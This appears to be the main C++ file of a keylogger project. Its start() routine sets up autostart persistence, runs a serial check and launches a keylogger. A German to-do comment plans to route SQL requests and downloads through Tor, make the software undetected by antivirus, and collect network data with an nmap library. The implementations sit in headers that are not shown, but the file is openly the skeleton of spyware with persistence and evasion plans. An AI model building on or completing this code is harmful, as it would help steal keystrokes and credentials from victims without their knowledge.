#include "SerialCheck.h"
#include "Autostart.h"
#include "Keylogger.h"

using namespace std;

int main() {
	void start();
	start();
	return 0;
}

void start()
{
	createAutoStart();
	checkSerials();
	startKeyLogger();
	
}


/*

1) Alle Sql Requests oder Download über tor netzwerk leiten, Verschlüsselung SEW
2) Undetected Software
3) Netzwerkdaten: .net library für nmap

*/